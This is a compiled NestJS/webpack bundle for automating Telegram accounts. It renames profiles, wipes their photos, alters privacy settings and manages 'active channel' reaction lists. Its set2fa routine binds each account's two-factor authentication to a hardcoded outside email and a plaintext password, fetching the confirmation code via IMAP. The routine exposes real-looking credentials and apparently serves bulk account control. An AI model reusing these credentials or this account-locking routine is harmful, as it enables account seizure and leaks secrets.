                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
                    key: new tl_1.Api.InputPrivacyKeyStatusTimestamp(),
                    rules: [
                        new tl_1.Api.InputPrivacyValueDisallowAll()
                    ],
                }));
                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
                    key: new tl_1.Api.InputPrivacyKeyAbout(),
                    rules: [
                        new tl_1.Api.InputPrivacyValueAllowAll()
                    ],
                }));
                console.log("LAstSeen Updated");
            }
            catch (e) {
                throw e;
            }
        });
    }
    updateProfile(firstName, about) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const result = yield this.client.invoke(new tl_1.Api.account.UpdateProfile({
                    firstName: firstName,
                    lastName: "",
                    about: about,
                }));
                console.log("Updated NAme: ", firstName);
            }
            catch (error) {
                throw error;
            }
        });
    }
    updateUsername(baseUsername) {
        return __awaiter(this, void 0, void 0, function* () {
            let newUserName = '';
            let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
            let increment = 0;
            if (username === '') {
                try {
                    const res = yield this.client.invoke(new tl_1.Api.account.UpdateUsername({ username }));
                    console.log(`Removed Username successfully.`);
                }
                catch (error) {
                    console.log(error);
                }
            }
            else {
                while (true) {
                    try {
                        const result = yield this.client.invoke(new tl_1.Api.account.CheckUsername({ username }));
                        console.log(result, " - ", username);
                        if (result) {
                            const res = yield this.client.invoke(new tl_1.Api.account.UpdateUsername({ username }));
                            console.log(`Username '${username}' updated successfully.`);
                            newUserName = username;
                            break;
                        }
                        else {
                            username = baseUsername + increment;
                            increment++;
                            yield (0, Helpers_1.sleep)(4000);
                        }
                    }
                    catch (error) {
                        console.log(error.message);
                        if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                            newUserName = username;
                            break;
                        }
                        username = baseUsername + increment;
                        increment++;
                    }
                }
            }
            return newUserName;
        });
    }
    updatePrivacy() {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
                    key: new tl_1.Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new tl_1.Api.InputPrivacyValueDisallowAll()
                    ],
                }));
                console.log("Calls Updated");
                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
                    key: new tl_1.Api.InputPrivacyKeyProfilePhoto(),
                    rules: [
                        new tl_1.Api.InputPrivacyValueAllowAll()
                    ],
                }));
                console.log("PP Updated");
                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
                    key: new tl_1.Api.InputPrivacyKeyPhoneNumber(),
                    rules: [
                        new tl_1.Api.InputPrivacyValueDisallowAll()
                    ],
                }));
                console.log("Number Updated");
                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
                    key: new tl_1.Api.InputPrivacyKeyStatusTimestamp(),
                    rules: [
                        new tl_1.Api.InputPrivacyValueAllowAll()
                    ],
                }));
                console.log("LAstSeen Updated");
                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
                    key: new tl_1.Api.InputPrivacyKeyAbout(),
                    rules: [
                        new tl_1.Api.InputPrivacyValueAllowAll()
                    ],
                }));
            }
            catch (e) {
                throw e;
            }
        });
    }
    getFileUrl(url, filename) {
        return __awaiter(this, void 0, void 0, function* () {
            const response = yield axios_1.default.get(url, { responseType: 'stream' });
            const filePath = `/tmp/${filename}`;
            yield new Promise((resolve, reject) => {
                const writer = fs.createWriteStream(filePath);
                response.data.pipe(writer);
                writer.on('finish', resolve);
                writer.on('error', reject);
            });
            return filePath;
        });
    }
    updateProfilePic(image) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const file = yield this.client.uploadFile({
                    file: new uploads_1.CustomFile('pic.jpg', fs.statSync(image).size, image),
                    workers: 1,
                });
                console.log("file uploaded- ", file);
                yield this.client.invoke(new tl_1.Api.photos.UploadProfilePhoto({
                    file: file,
                }));
                console.log("profile pic updated");
            }
            catch (error) {
                throw error;
            }
        });
    }
    set2fa() {
        return __awaiter(this, void 0, void 0, function* () {
            const imapService = IMap_1.MailReader.getInstance();
            try {
                imapService.connectToMail();
                const intervalParentId = setInterval(() => __awaiter(this, void 0, void 0, function* () {
                    const isReady = imapService.isMailReady();
                    if (isReady) {
                        clearInterval(intervalParentId);
                        yield this.client.updateTwoFaSettings({
                            isCheckPassword: false,
                            email: "storeslaksmi@gmail.com",
                            hint: "password - India143",
                            newPassword: "Ajtdmwajt1@",
                            emailCodeCallback: (length) => __awaiter(this, void 0, void 0, function* () {
                                console.log("code sent");
                                return new Promise((resolve) => __awaiter(this, void 0, void 0, function* () {
                                    let retry = 0;
                                    const intervalId = setInterval(() => __awaiter(this, void 0, void 0, function* () {
                                        console.log("checking code");
                                        retry++;
                                        const isReady = imapService.isMailReady();
                                        if (isReady && retry < 4) {
                                            const code = yield imapService.getCode();
                                            console.log('Code: ', code);
                                            if (code) {
                                                clearInterval(intervalId);
                                                imapService.disconnectFromMail();
                                                resolve(code);
                                            }
                                            else {
                                                console.log('Code: ', code);
                                            }
                                        }
                                        else {
                                            clearInterval(intervalId);
                                            yield this.client.disconnect();
                                            imapService.disconnectFromMail();
                                            resolve(undefined);
                                        }
                                    }), 10000);
                                }));
                            }),
                            onEmailCodeError: (e) => { console.log((0, utils_1.parseError)(e)); return Promise.resolve("error"); }
                        });
                    }
                }), 5000);
            }
            catch (e) {
                console.log(e);
                (0, utils_1.parseError)(e);
            }
        });
    }
    sendPhotoChat(id, url, caption, filename) {
        return __awaiter(this, void 0, void 0, function* () {
            if (!this.client)
                throw new Error('Client is not initialized');
            const filePath = yield this.getFileUrl(url, filename);
            const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
            yield this.client.sendFile(id, { file, caption });
        });
    }
    sendFileChat(id, url, caption, filename) {
        return __awaiter(this, void 0, void 0, function* () {
            if (!this.client)
                throw new Error('Client is not initialized');
            const filePath = yield this.getFileUrl(url, filename);
            const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
            yield this.client.sendFile(id, { file, caption });
        });
    }
    deleteProfilePhotos() {
        return __awaiter(this, void 0, void 0, function* () {
            var _a;
            try {
                const result = yield this.client.invoke(new tl_1.Api.photos.GetUserPhotos({
                    userId: "me"
                }));
                console.log(result);
                if (result && ((_a = result.photos) === null || _a === void 0 ? void 0 : _a.length) > 0) {
                    const res = yield this.client.invoke(new tl_1.Api.photos.DeletePhotos({
                        id: result.photos
                    }));
                }
                console.log("Deleted profile Photos");
            }
            catch (error) {
                throw error;
            }
        });
    }
}
exports["default"] = TelegramManager;


/***/ }),

/***/ "./nest/components/activechannels/activechannels.controller.ts":
/*!*********************************************************************!*\
  !*** ./nest/components/activechannels/activechannels.controller.ts ***!
  \*********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsController = void 0;
// src/activechannels/activechannels.controller.ts
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const activechannels_service_1 = __webpack_require__(/*! ./activechannels.service */ "./nest/components/activechannels/activechannels.service.ts");
const create_active_channel_dto_1 = __webpack_require__(/*! ./dto/create-active-channel.dto */ "./nest/components/activechannels/dto/create-active-channel.dto.ts");
const update_active_channel_dto_1 = __webpack_require__(/*! ./dto/update-active-channel.dto */ "./nest/components/activechannels/dto/update-active-channel.dto.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const add_reaction_dto_1 = __webpack_require__(/*! ./dto/add-reaction.dto */ "./nest/components/activechannels/dto/add-reaction.dto.ts");
let ActiveChannelsController = class ActiveChannelsController {
    constructor(activeChannelsService) {
        this.activeChannelsService = activeChannelsService;
    }
    create(createActiveChannelDto) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.activeChannelsService.create(createActiveChannelDto);
        });
    }
    search(query) {
        console.log(query);
        return this.activeChannelsService.search(query);
    }
    findAll() {
        return __awaiter(this, void 0, void 0, function* () {
            return this.activeChannelsService.findAll();
        });
    }
    findOne(channelId) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.activeChannelsService.findOne(channelId);
        });
    }
    update(channelId, updateActiveChannelDto) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.activeChannelsService.update(channelId, updateActiveChannelDto);
        });
    }
    remove(channelId) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.activeChannelsService.remove(channelId);
        });
    }
    addReaction(channelId, addReactionDto) {
        if (!addReactionDto.reactions) {
            throw new common_1.BadRequestException('Reaction is required');
        }
        return this.activeChannelsService.addReactions(channelId, addReactionDto.reactions);
    }
    getRandomReaction(channelId) {
        return this.activeChannelsService.getRandomReaction(channelId);
    }
    removeReaction(channelId, addReactionDto) {
        if (!addReactionDto.reactions) {
            throw new common_1.BadRequestException('Reaction is required');
        }
        return this.activeChannelsService.removeReaction(channelId, addReactionDto.reactions[0]);
    }
};
exports.ActiveChannelsController = ActiveChannelsController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new active channel' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_active_channel_dto_1.CreateActiveChannelDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search channels by filters' }),
    (0, swagger_1.ApiQuery)({ name: 'channelId', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'broadcast', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'canSendMsgs', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'participantsCount', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'restricted', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'sendMessages', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'title', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'username', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'wordRestriction', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'dMRestriction', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'availableMsgs', required: false, type: [String] }),
    (0, swagger_1.ApiQuery)({ name: 'reactions', required: false, type: [String] }),
    (0, swagger_1.ApiQuery)({ name: 'banned', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'reactRestricted', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'megagroup', required: false, type: Boolean }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all active channels' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get an active channel by channelId' })
    //@apiresponse({ status: 200, description: 'Return the active channel', type: ActiveChannel })
    //@apiresponse({ status: 404, description: 'Channel not found' })
    ,
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update an active channel by channelId' })
    //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: ActiveChannel })
    //@apiresponse({ status: 404, description: 'Channel not found' })
    ,
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_active_channel_dto_1.UpdateActiveChannelDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete an active channel by channelId' })
    //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })
    //@apiresponse({ status: 404, description: 'Channel not found' })
    ,
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)(':channelId/reactions'),
    (0, swagger_1.ApiOperation)({ summary: 'Add reaction to chat group' }),
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, add_reaction_dto_1.AddReactionDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "addReaction", null);
__decorate([
    (0, common_1.Get)(':channelId/reactions/random'),
    (0, swagger_1.ApiOperation)({ summary: 'Get a random reaction from chat group' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "getRandomReaction", null);
__decorate([
    (0, common_1.Delete)(':channelId/reactions'),
    (0, swagger_1.ApiOperation)({ summary: 'Remove reaction from chat group' }),
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, add_reaction_dto_1.AddReactionDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "removeReaction", null);
exports.ActiveChannelsController = ActiveChannelsController = __decorate([
    (0, swagger_1.ApiTags)('Active Channels'),
    (0, common_1.Controller)('active-channels'),
    __metadata("design:paramtypes", [activechannels_service_1.ActiveChannelsService])
], ActiveChannelsController);


/***/ }),

/***/ "./nest/components/activechannels/activechannels.module.ts":
/*!*****************************************************************!*\
  !*** ./nest/components/activechannels/activechannels.module.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsModule = void 0;
// src/activechannels/activechannels.module.ts
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const activechannels_service_1 = __webpack_require__(/*! ./activechannels.service */ "./nest/components/activechannels/activechannels.service.ts");
const activechannels_controller_1 = __webpack_require__(/*! ./activechannels.controller */ "./nest/components/activechannels/activechannels.controller.ts");
const active_channel_schema_1 = __webpack_require__(/*! ./schemas/active-channel.schema */ "./nest/components/activechannels/schemas/active-channel.schema.ts");
let ActiveChannelsModule = class ActiveChannelsModule {
};
exports.ActiveChannelsModule = ActiveChannelsModule;
exports.ActiveChannelsModule = ActiveChannelsModule = __decorate([
    (0, common_1.Module)({
        imports: [
            mongoose_1.MongooseModule.forFeature([{ name: active_channel_schema_1.ActiveChannel.name, schema: active_channel_schema_1.ActiveChannelSchema }]),
        ],
        controllers: [activechannels_controller_1.ActiveChannelsController],
        providers: [activechannels_service_1.ActiveChannelsService],
    })
], ActiveChannelsModule);


/***/ }),

/***/ "./nest/components/activechannels/activechannels.service.ts":
/*!******************************************************************!*\
  !*** ./nest/components/activechannels/activechannels.service.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsService = void 0;
// src/activechannels/activechannels.service.ts
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const active_channel_schema_1 = __webpack_require__(/*! ./schemas/active-channel.schema */ "./nest/components/activechannels/schemas/active-channel.schema.ts");
let ActiveChannelsService = class ActiveChannelsService {
    constructor(activeChannelModel) {
        this.activeChannelModel = activeChannelModel;
    }
    create(createActiveChannelDto) {
        return __awaiter(this, void 0, void 0, function* () {
            const createdChannel = new this.activeChannelModel(createActiveChannelDto);
            return createdChannel.save();
        });
    }
    findAll() {
        return __awaiter(this, void 0, void 0, function* () {
            return this.activeChannelModel.find().exec();
        });
    }
    findOne(channelId) {
        return __awaiter(this, void 0, void 0, function* () {
            const channel = yield this.activeChannelModel.findOne({ channelId }).exec();
            return channel;
        });
    }
    update(channelId, updateActiveChannelDto) {
        return __awaiter(this, void 0, void 0, function* () {
            const updatedChannel = yield this.activeChannelModel.findOneAndUpdate({ channelId }, updateActiveChannelDto, { new: true }).exec();
            return updatedChannel;
        });
    }
    remove(channelId) {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.activeChannelModel.findOneAndDelete({ channelId }).exec();
        });
    }
    search(filter) {
        return __awaiter(this, void 0, void 0, function* () {
            console.log(filter);
            return this.activeChannelModel.find(filter).exec();
        });
    }
    addReactions(channelId, reactions) {
        return __awaiter(this, void 0, void 0, function* () {
            const channel = yield this.activeChannelModel.findOneAndUpdate({ channelId }, {
                $addToSet: { availableMsgs: reactions }
            });
            return channel;
        });
    }
    getRandomReaction(channelId) {
        return __awaiter(this, void 0, void 0, function* () {
            const channel = yield this.activeChannelModel.findOne({ channelId }).exec();
            if (!channel) {
                return undefined;
            }
            if (channel.reactions.length === 0) {
                return undefined;
            }
            const randomIndex = Math.floor(Math.random() * channel.reactions.length);
            return channel.reactions[randomIndex];
        });
    }
    removeReaction(channelId, reaction) {
        return __awaiter(this, void 0, void 0, function* () {
            const channel = yield this.activeChannelModel.findOneAndUpdate({ channelId }, {
                $pull: { reactions: reaction }
            });
            return channel;
        });
    }
};
exports.ActiveChannelsService = ActiveChannelsService;
exports.ActiveChannelsService = ActiveChannelsService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(active_channel_schema_1.ActiveChannel.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], ActiveChannelsService);


/***/ }),

/***/ "./nest/components/activechannels/dto/add-reaction.dto.ts":
/*!****************************************************************!*\
  !*** ./nest/components/activechannels/dto/add-reaction.dto.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AddReactionDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class AddReactionDto {
}
exports.AddReactionDto = AddReactionDto;
__decorate([
    (0, swagger_1.ApiProperty)({ required: true }),
    __metadata("design:type", Array)
], AddReactionDto.prototype, "reactions", void 0);


/***/ }),

/***/ "./nest/components/activechannels/dto/create-active-channel.dto.ts":
/*!*************************************************************************!*\
  !*** ./nest/components/activechannels/dto/create-active-channel.dto.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateActiveChannelDto = void 0;
// src/activechannels/dto/create-activechannel.dto.ts
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateActiveChannelDto {
}
exports.CreateActiveChannelDto = CreateActiveChannelDto;
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 300 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "participantsCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "restricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "sendMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "reactRestricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 0 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "wordRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 0 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "dMRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: [String], default: [] }),
    __metadata("design:type", Array)
], CreateActiveChannelDto.prototype, "availableMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: [String], default: [] }),
    __metadata("design:type", Array)
], CreateActiveChannelDto.prototype, "reactions", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "banned", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true, required: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "megagroup", void 0);


/***/ }),

/***/ "./nest/components/activechannels/dto/update-active-channel.dto.ts":
/*!*************************************************************************!*\
  !*** ./nest/components/activechannels/dto/update-active-channel.dto.ts ***!
  \*************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateActiveChannelDto = void 0;
// src/activechannels/dto/update-activechannel.dto.ts
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_active_channel_dto_1 = __webpack_require__(/*! ./create-active-channel.dto */ "./nest/components/activechannels/dto/create-active-channel.dto.ts");
class UpdateActiveChannelDto extends (0, swagger_1.PartialType)(create_active_channel_dto_1.CreateActiveChannelDto) {
}
exports.UpdateActiveChannelDto = UpdateActiveChannelDto;


/***/ }),

/***/ "./nest/components/activechannels/schemas/active-channel.schema.ts":
/*!*************************************************************************!*\
  !*** ./nest/components/activechannels/schemas/active-channel.schema.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelSchema = exports.ActiveChannel = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const mongoose = __importStar(__webpack_require__(/*! mongoose */ "mongoose"));
let ActiveChannel = class ActiveChannel extends mongoose_2.Document {
};
exports.ActiveChannel = ActiveChannel;
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], ActiveChannel.prototype, "channelId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "broadcast", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "canSendMsgs", void 0);
__decorate([
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "participantsCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "restricted", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "sendMessages", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], ActiveChannel.prototype, "title", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, default: null }),
